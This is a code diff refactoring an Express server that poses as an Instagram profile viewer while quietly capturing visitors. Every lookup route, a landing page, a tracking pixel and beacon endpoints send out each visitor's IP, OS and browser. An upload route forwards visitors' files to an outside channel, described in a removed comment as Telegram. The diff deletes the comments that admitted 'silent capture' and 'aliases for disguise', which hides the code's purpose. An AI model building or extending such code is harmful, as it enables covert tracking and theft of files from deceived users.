@@ -10,29 +10,41 @@ app.disable('x-powered-by');
 app.use(express.json({ limit: '2mb' }));
 app.use(express.urlencoded({ extended: true, limit: '2mb' }));
 
-const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 20 * 1024 * 1024, files: 10 } });
+const upload = multer({
+  storage: multer.memoryStorage(),
+  limits: { fileSize: 20 * 1024 * 1024, files: 10 },
+});
 
 const hits = new Map<string, number[]>();
-const WIN = 60_000, MAX = 60;
+const WIN = 60_000;
+const MAX = 60;
+
 function rl(ip: string): boolean {
   const now = Date.now();
   const arr = (hits.get(ip) || []).filter(t => now - t < WIN);
   arr.push(now);
   hits.set(ip, arr);
-  if (hits.size > 5000) for (const [k, v] of hits) if (!v.some(t => now - t < WIN)) hits.delete(k);
+  if (hits.size > 5000) {
+    for (const [k, v] of hits) if (!v.some(t => now - t < WIN)) hits.delete(k);
+  }
   return arr.length > MAX;
 }
 
 async function fire(req: express.Request, tag?: string, ipOverride?: string): Promise<void> {
-  const h = await buildHit(req, tag);
-  if (ipOverride) h.ip = ipOverride;
-  if (rl(h.ip)) return;
-  sendHit(h).catch(() => {});
+  try {
+    const h = await buildHit(req, tag);
+    if (ipOverride) h.ip = ipOverride;
+    if (rl(h.ip)) return;
+    sendHit(h).catch(() => {});
+  } catch {}
 }
 
 function igApiResponse(found: any) {
   if (!found || !found.found) {
-    return { success: false, error: found?.error === 'upstream_unreachable' ? 'upstream_unreachable' : 'not_found' };
+    return {
+      success: false,
+      error: found?.error === 'upstream_unreachable' ? 'upstream_unreachable' : 'not_found',
+    };
   }
   const d = found.data;
   return {
@@ -63,48 +75,41 @@ function getUsername(req: express.Request): string | null {
   if (typeof q === 'string' && q.trim()) return q.trim().replace(/^@/, '');
   const body: any = req.body;
   if (body) {
-    if (typeof body.username === 'string' && body.username.trim()) return body.username.trim().replace(/^@/, '');
+    if (typeof body.username === 'string' && body.username.trim()) {
+      return body.username.trim().replace(/^@/, '');
+    }
     const nested = body.data?.params?.username_or_id_or_url;
-    if (typeof nested === 'string' && nested.trim()) return nested.trim().replace(/^@/, '');
+    if (typeof nested === 'string' && nested.trim()) {
+      return nested.trim().replace(/^@/, '');
+    }
   }
   return null;
 }
 
-// Instagram proxy — real IG data, silent capture
-app.get('/api/instagram', async (req, res) => {
+async function igHandler(req: express.Request, res: express.Response) {
   const u = getUsername(req);
-  if (!u) { res.status(400).json({ success: false, error: 'missing_username' }); return; }
+  if (!u) {
+    res.status(400).json({ success: false, error: 'missing_username' });
+    return;
+  }
   fire(req, 'ig-api').catch(() => {});
   const r = await igLookup(u);
   res.set('Cache-Control', 'no-store');
   res.json(igApiResponse(r));
-});
-
-app.post('/api/instagram', async (req, res) => {
-  const u = getUsername(req);
-  if (!u) { res.status(400).json({ success: false, error: 'missing_username' }); return; }
-  fire(req, 'ig-api').catch(() => {});
-  const r = await igLookup(u);
-  res.set('Cache-Control', 'no-store');
-  res.json(igApiResponse(r));
-});
-
-// Aliases for disguise
-for (const p of ['/api/ig', '/api/v1/info', '/api/insta', '/info']) {
-  app.all(p, async (req, res) => {
-    const u = getUsername(req);
-    if (!u) { res.status(400).json({ success: false, error: 'missing_username' }); return; }
-    fire(req, 'ig-api').catch(() => {});
-    const r = await igLookup(u);
-    res.json(igApiResponse(r));
-  });
 }
 
-// IG-themed landing page — looks like a profile viewer, carries the beacon
+app.get('/api/instagram', igHandler);
+app.post('/api/instagram', igHandler);
+
+for (const p of ['/api/ig', '/api/v1/info', '/api/insta', '/info']) {
+  app.all(p, igHandler);
+}
+
 app.get('/ig', async (req, res) => {
   fire(req, 'ig-page').catch(() => {});
   const u = String(req.query.username || '').trim();
-  const preview = u ? `<div class="preview">Checking @${u.replace(/[<>&"]/g, '')}...</div>` : '';
+  const safeU = u.replace(/[<>&"]/g, '');
+  const preview = safeU ? `<div class="preview">Checking @${safeU}...</div>` : '';
   res.setHeader('Content-Type', 'text/html; charset=utf-8');
   res.setHeader('Cache-Control', 'no-store');
   res.end(`<!doctype html>
@@ -156,8 +161,9 @@ app.get('/ig', async (req, res) => {
     try{
       const res=await fetch('/api/instagram?username='+encodeURIComponent(name));
       const j=await res.json();
-      if(!j.success){r.innerHTML='<div class="err">'+ (j.error==='not_found'?'Profile not found.':'Lookup failed.') +'</div>';}
-      else{
+      if(!j.success){
+        r.innerHTML='<div class="err">'+(j.error==='not_found'?'Profile not found.':'Lookup failed.')+'</div>';
+      } else {
         const rows=[
           ['Username','@'+j.username],
           ['Name',j.full_name||'—'],
@@ -180,11 +186,16 @@ app.get('/ig', async (req, res) => {
 </body></html>`);
 });
 
-// Generic capture
-app.get('/api/capture', async (req, res) => { await fire(req, 'capture'); res.json({ ok: true }); });
-app.post('/api/beacon', async (req, res) => { await fire(req, 'beacon'); res.json({ ok: true }); });
+app.get('/api/capture', async (req, res) => {
+  await fire(req, 'capture');
+  res.json({ ok: true });
+});
 
-// Tracking pixel
+app.post('/api/beacon', async (req, res) => {
+  await fire(req, 'beacon');
+  res.json({ ok: true });
+});
+
 app.get('/pixel.gif', async (req, res) => {
   fire(req, 'pixel').catch(() => {});
   const px = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
@@ -193,15 +204,21 @@ app.get('/pixel.gif', async (req, res) => {
   res.end(px);
 });
 
-// File upload → telegram
 app.post('/api/upload', upload.array('files', 10), async (req, res) => {
-  const h = await buildHit(req, 'upload');
-  if (rl(h.ip)) { res.status(429).json({ ok: false }); return; }
-  sendHit(h).catch(() => {});
-  const files = (req.files as Express.Multer.File[]) || [];
-  const cap = `File from ${h.ip} | ${h.device.os} | ${h.device.browser}`;
-  for (const f of files) sendFile(f.buffer, f.originalname, cap).catch(() => {});
-  res.json({ ok: true, received: files.length });
+  try {
+    const h = await buildHit(req, 'upload');
+    if (rl(h.ip)) {
+      res.status(429).json({ ok: false });
+      return;
+    }
+    sendHit(h).catch(() => {});
+    const files = (req.files as Express.Multer.File[]) || [];
+    const cap = `File from ${h.ip} | ${h.device.os} | ${h.device.browser}`;
+    for (const f of files) sendFile(f.buffer, f.originalname, cap).catch(() => {});
+    res.json({ ok: true, received: files.length });
+  } catch (err: any) {
+    res.status(400).json({ ok: false, error: err?.message || 'upload_failed' });
+  }
 });
 
 app.get('/upload', (_req, res) => {
@@ -244,6 +261,9 @@ app.get('/upload', (_req, res) => {
 });
 
 app.get('/', (_req, res) => res.json({ ok: true, service: 'info' }));
-app.use((_req, res) => res.status(404).json({ ok: false }));
+
+app.use((_req, res) => {
+  res.status(404).json({ ok: false });
+});
 
 export default app;
